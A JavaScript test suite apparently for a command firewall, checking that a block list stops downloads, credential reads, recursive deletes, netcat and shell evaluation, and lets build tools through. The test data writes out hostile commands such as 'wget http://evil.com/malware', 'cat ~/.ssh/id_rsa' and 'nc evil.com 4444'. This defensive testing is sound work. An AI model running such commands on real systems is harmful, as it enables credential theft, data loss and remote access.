/**
 * Comprehensive Commands Config Coverage Tests
 * Tests EVERY command pattern (blocked and allowed)
 */

const {
  setupTestDir,
  cleanupTestDir,
  writeMinimalConfig,
  runWithFirewall,
  isBlocked,
  TestTracker
} = require('../utils');

async function runCommandsCoverageTests() {
  const tracker = new TestTracker('commands-coverage');
  
  console.log('\n════════════════════════════════════════════════════════════');
  console.log('[CMD-COV] COMMANDS CONFIG COVERAGE');
  console.log('════════════════════════════════════════════════════════════\n');
  
  // =========================================================================
  // BLOCKED PATTERNS - Test each one
  // =========================================================================
  console.log('--- Blocked Patterns (Every Config Entry) ---\n');
  
  const blockedPatterns = [
    { pattern: 'curl.*(-o|--output|>)', cmd: 'curl -o /tmp/malware http://evil.com', desc: 'Download to file' },
    { pattern: 'wget', cmd: 'wget http://evil.com/malware', desc: 'Download file' },
    { pattern: 'cat\\s+~/\\.(ssh|aws|gnupg)', cmd: 'cat ~/.ssh/id_rsa', desc: 'Read sensitive files' },
    { pattern: 'rm\\s+(-rf?|--recursive)', cmd: 'rm -rf /important', desc: 'Recursive delete' },
    { pattern: 'nc\\s+', cmd: 'nc evil.com 4444', desc: 'Network connection' },
    { pattern: 'bash\\s+-c', cmd: 'bash -c "malicious code"', desc: 'Shell command execution' },
    { pattern: 'eval\\s+', cmd: 'eval "dangerous code"', desc: 'Code evaluation' }
  ];
  
  for (const { pattern, cmd, desc } of blockedPatterns) {
    await tracker.runTest(`blockedPatterns - ${desc}`, async () => {
      const testDir = setupTestDir('cmd-blocked-' + desc.replace(/\s+/g, '_'));
      
      try {
        writeMinimalConfig(testDir, {
          commands: {
            blockedPatterns: blockedPatterns.map(p => ({
              pattern: p.pattern,
              severity: 'high',
              description: p.desc
            })),
            allowedCommands: []
          }
        });
        
        const code = `
          const { exec } = require('child_process');
          exec('${cmd.replace(/\\/g, "\\\\").replace(/'/g, "\\'")}', (err, stdout, stderr) => {
            if (err) {
              console.log('CMD_BLOCKED:' + err.message);
            } else {
              console.log('CMD_BYPASS_SUCCESS');
            }
          });
          setTimeout(() => process.exit(0), 2000);
        `;
        
        const result = await runWithFirewall(testDir, code, { timeout: 5000 });
        
        return {
          pass: isBlocked(result.output) || result.output.includes('CMD_BLOCKED'),
          reason: result.output.includes('CMD_BYPASS_SUCCESS') ? `BYPASS: ${desc} executed` : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
  }
  
  // =========================================================================
  // ALLOWED COMMANDS - Test each one (should NOT be blocked)
  // =========================================================================
  console.log('\n--- Allowed Commands (Every Config Entry - Should Allow) ---\n');
  
  const allowedCommands = [
    { cmd: 'npm', args: '--version', desc: 'npm' },
    { cmd: 'node', args: '--version', desc: 'node' },
    { cmd: 'git', args: '--version', desc: 'git' },
    { cmd: 'make', args: '--version', desc: 'make' },
    { cmd: 'cmake', args: '--version', desc: 'cmake' },
    { cmd: 'gcc', args: '--version', desc: 'gcc' },
    { cmd: 'g++', args: '--version', desc: 'g++' },
    { cmd: 'python', args: '--version', desc: 'python' },
    { cmd: 'python3', args: '--version', desc: 'python3' }
  ];
  
  for (const { cmd, args, desc } of allowedCommands) {
    await tracker.runTest(`allowedCommands - ${desc} (should allow)`, async () => {
      const testDir = setupTestDir('cmd-allowed-' + desc);
      
      try {
        writeMinimalConfig(testDir, {
          commands: {
            blockedPatterns: [],
            allowedCommands: allowedCommands.map(c => c.cmd)
          }
        });
        
        const code = `
          const { exec } = require('child_process');
          exec('${cmd} ${args}', (err, stdout, stderr) => {
            if (err) {
              // Command might not exist on system, but shouldn't be blocked by firewall
              if (err.message.includes('Firewall')) {
                console.log('ALLOWED_BLOCKED:' + err.message);
              } else {
                console.log('ALLOWED_SUCCESS:not_installed');
              }
            } else {
              console.log('ALLOWED_SUCCESS:' + stdout.substring(0, 20));
            }
          });
          setTimeout(() => process.exit(0), 2000);
        `;
        
        const result = await runWithFirewall(testDir, code, { timeout: 5000 });
        
        // Pass if command executed successfully OR if it failed due to not being installed (not firewall)
        const isFirewallBlocked = result.output.includes('ALLOWED_BLOCKED') && result.output.includes('Firewall');
        const isAllowed = result.output.includes('ALLOWED_SUCCESS') || !isFirewallBlocked;
        
        return {
          pass: isAllowed,
          reason: isFirewallBlocked ? `ERROR: ${desc} blocked when should be allowed` : 'allowed',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
  }
  
  // =========================================================================
  // COMMAND VARIANTS - Test different spawn methods
  // =========================================================================
  console.log('\n--- Command Execution Variants ---\n');
  
  await tracker.runTest('blockedPatterns - spawn() variant', async () => {
    const testDir = setupTestDir('cmd-spawn-variant');
    
    try {
      writeMinimalConfig(testDir, {
        commands: {
          blockedPatterns: [{ pattern: 'curl', severity: 'high', description: 'curl' }],
          allowedCommands: []
        }
      });
      
      const code = `
        const { spawn } = require('child_process');
        const proc = spawn('curl', ['http://evil.com']);
        proc.on('error', (err) => {
          console.log('SPAWN_BLOCKED:' + err.message);
        });
        proc.on('close', (code) => {
          if (code === 0) {
            console.log('SPAWN_BYPASS_SUCCESS');
          }
        });
        setTimeout(() => process.exit(0), 2000);
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      return {
        pass: isBlocked(result.output) || result.output.includes('SPAWN_BLOCKED'),
        reason: result.output.includes('SPAWN_BYPASS_SUCCESS') ? 'BYPASS: spawn() not blocked' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  await tracker.runTest('blockedPatterns - execSync() variant', async () => {
    const testDir = setupTestDir('cmd-execsync-variant');
    
    try {
      writeMinimalConfig(testDir, {
        commands: {
          blockedPatterns: [{ pattern: 'wget', severity: 'high', description: 'wget' }],
          allowedCommands: []
        }
      });
      
      const code = `
        const { execSync } = require('child_process');
        try {
          execSync('wget http://evil.com');
          console.log('EXECSYNC_BYPASS_SUCCESS');
        } catch (err) {
          console.log('EXECSYNC_BLOCKED:' + err.message);
        }
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      return {
        pass: isBlocked(result.output) || result.output.includes('EXECSYNC_BLOCKED'),
        reason: result.output.includes('EXECSYNC_BYPASS_SUCCESS') ? 'BYPASS: execSync() not blocked' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  await tracker.runTest('blockedPatterns - spawnSync() variant', async () => {
    const testDir = setupTestDir('cmd-spawnsync-variant');
    
    try {
      writeMinimalConfig(testDir, {
        commands: {
          blockedPatterns: [{ pattern: 'nc', severity: 'high', description: 'netcat' }],
          allowedCommands: []
        }
      });
      
      const code = `
        const { spawnSync } = require('child_process');
        const result = spawnSync('nc', ['evil.com', '4444']);
        if (result.error) {
          console.log('SPAWNSYNC_BLOCKED:' + result.error.message);
        } else if (result.status === 0) {
          console.log('SPAWNSYNC_BYPASS_SUCCESS');
        } else {
          console.log('SPAWNSYNC_FAILED');
        }
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      return {
        pass: isBlocked(result.output) || result.output.includes('SPAWNSYNC_BLOCKED'),
        reason: result.output.includes('SPAWNSYNC_BYPASS_SUCCESS') ? 'BYPASS: spawnSync() not blocked' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  return tracker.getSummary();
}

module.exports = { runCommandsCoverageTests };

if (require.main === module) {
  runCommandsCoverageTests().then(summary => {
    console.log('\nCommands Coverage Summary:');
    console.log(`  Passed: ${summary.passed}`);
    console.log(`  Failed: ${summary.failed}`);
    console.log(`  Skipped: ${summary.skipped}`);
    process.exit(summary.failed > 0 ? 1 : 0);
  });
}
